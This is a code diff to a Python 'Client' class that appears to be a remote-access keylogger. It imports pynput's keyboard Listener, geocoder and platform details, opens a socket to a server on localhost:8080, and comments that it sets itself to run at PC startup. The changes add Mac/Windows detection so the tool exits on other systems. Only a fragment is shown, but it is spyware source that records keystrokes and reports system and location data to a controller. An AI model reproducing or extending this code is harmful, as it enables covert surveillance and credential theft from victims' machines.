@@ -1,8 +1,8 @@
-import os
+from sys import exit
 import socket as s
 import geocoder
 from os import getcwd
-from platform import uname, processor
+from platform import uname, processor, system
 from time import sleep
 from pynput.keyboard import Listener
 
@@ -10,7 +10,18 @@ from pynput.keyboard import Listener
 class Client:
     def __init__(self):
         # checking and set the file at the start of pc
-        self.os = os.name
+        self.os = system()
+
+        # True = os is mac | False = os is windows
+        self.mod = True
+        if self.os == "Darwin":
+            self.mod = True
+        elif self.os == "Windows":
+            self.mod = False
+        else:
+            exit()
+
+        # Setting impoortant var
         self.client = s.socket()
         self.host = "localhost"
         self.port = 8080
@@ -26,6 +37,7 @@ class Client:
         self.key_logger()
 
     # Send message to the server
+
     def sendmsg(self, msg):
         self.client.send(msg.encode())
 
